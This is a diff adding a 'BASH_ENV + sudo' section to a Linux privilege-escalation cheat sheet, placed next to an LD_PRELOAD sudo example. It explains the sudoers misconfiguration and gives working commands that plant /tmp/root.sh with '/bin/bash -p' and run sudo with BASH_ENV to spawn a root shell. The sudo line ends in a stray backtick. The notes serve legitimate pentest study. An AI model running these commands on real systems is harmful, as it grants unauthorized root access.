@@ -39,6 +39,29 @@ sudo LD_PRELOAD=./exploit.so /usr/bin/ping
 
 ---
 
+## BASH_ENV + sudo
+
+### 🔹 Exploit example
+
+`BASH_ENV` is an environment variable read by **bash** before executing any non-interactive script.  
+If `/etc/sudoers` contains:
+
+```bash
+env_keep+="BASH_ENV"
+```
+
+then `sudo` will preserve this variable, allowing privilege escalation if you can run a bash script as root.
+
+```bash
+echo '/bin/bash -p' > /tmp/root.sh
+chmod +x /tmp/root.sh
+sudo BASH_ENV=/tmp/root.sh /usr/bin/systeminfo`
+```
+
+Here, `/usr/bin/systeminfo` is a root-allowed bash script.  
+Before executing it, bash will source `/tmp/root.sh`, spawning a root shell.
+
+--- 
 ##  Crontab 
 
 ###  🔹Where to look:
